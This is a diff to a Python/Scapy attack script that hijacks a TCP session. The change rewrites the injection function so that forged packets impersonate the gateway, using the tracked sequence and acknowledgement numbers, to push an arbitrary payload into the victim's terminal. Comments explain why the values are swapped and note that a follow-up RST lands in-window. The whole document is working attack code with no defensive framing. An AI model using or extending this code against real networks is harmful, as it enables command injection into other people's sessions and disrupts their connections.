@@ -122,20 +122,25 @@ def session_callback(pkt, victim_ip: str, target_port: int):
 # ── Injection ─────────────────────────────────────────────────────────────────
 
 def inject_payload(payload: bytes):
-    """Forge a TCP packet with the victim's current sequence numbers."""
+    """Forge a TCP packet as the gateway sending data to the victim.
+
+    Injecting gateway→victim makes the payload appear at the victim's
+    terminal. The gateway's current seq is what the victim has been
+    acking, which is already tracked in session["next_ack"].
+    """
     with session_lock:
         if not session["found"] or session["next_seq"] is None:
             print("[-] Session state not ready for injection")
             return False
 
         inject_pkt = (
-            IP(src=session["src_ip"], dst=session["dst_ip"])
+            IP(src=session["dst_ip"], dst=session["src_ip"])
             / TCP(
-                sport=session["src_port"],
-                dport=session["dst_port"],
-                flags="PA",                # Push + Ack
-                seq=session["next_seq"],
-                ack=session["next_ack"],
+                sport=session["dst_port"],
+                dport=session["src_port"],
+                flags="PA",
+                seq=session["next_ack"],   # gateway's current seq
+                ack=session["next_seq"],   # what gateway expects from victim
             )
             / Raw(load=payload)
         )
@@ -143,9 +148,9 @@ def inject_payload(payload: bytes):
     send(inject_pkt, verbose=False)
     print(f"[+] Injected {len(payload)} bytes: {payload!r}")
 
-    # Advance the local seq counter to prevent collision
+    # Advance the gateway's seq so the follow-up RST lands in-window
     with session_lock:
-        session["next_seq"] += len(payload)
+        session["next_ack"] += len(payload)
 
     return True
 
